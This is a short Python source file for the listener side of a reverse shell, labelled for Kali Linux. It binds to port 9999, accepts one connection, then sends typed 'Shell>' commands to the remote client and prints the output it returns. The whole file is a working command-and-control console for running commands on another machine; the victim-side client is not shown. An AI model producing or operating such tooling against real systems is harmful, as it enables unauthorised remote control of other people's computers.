# server.py (Kali Linux - Listener)

import socket
import subprocess
import os

# Server settings
HOST = '0.0.0.0'  # Bind to all available interfaces
PORT = 9999  # Port to listen on
BUFFER_SIZE = 2048

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the host and port
server_socket.bind((HOST, PORT))

# Enable the server to accept connections (max 5 connections in the queue)
server_socket.listen(5)

print(f"[*] Listening on {HOST}:{PORT}...")

# Accept incoming connection
client_socket, client_address = server_socket.accept()

print(f"[*] Connection established with {client_address}")

while True:
    try:
        # Receive the command from the server
        command = input("Shell> ")

        # Send the command to the client
        if command.lower() == "exit":
            client_socket.send(b"exit")
            print("[*] Closing connection...")
            break

        # Send the command to the client
        client_socket.send(command.encode())

        # Receive the command output from the client

        response = client_socket.recv(BUFFER_SIZE)
        if not response:
            break

        # Try to decode as UTF-8 text
        try:
            print(response.decode('utf-8', errors='replace'))
        except UnicodeDecodeError:
            print("[*] Binary data received (non-text output).")

    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        break

# Close the connection
client_socket.close()
server_socket.close()
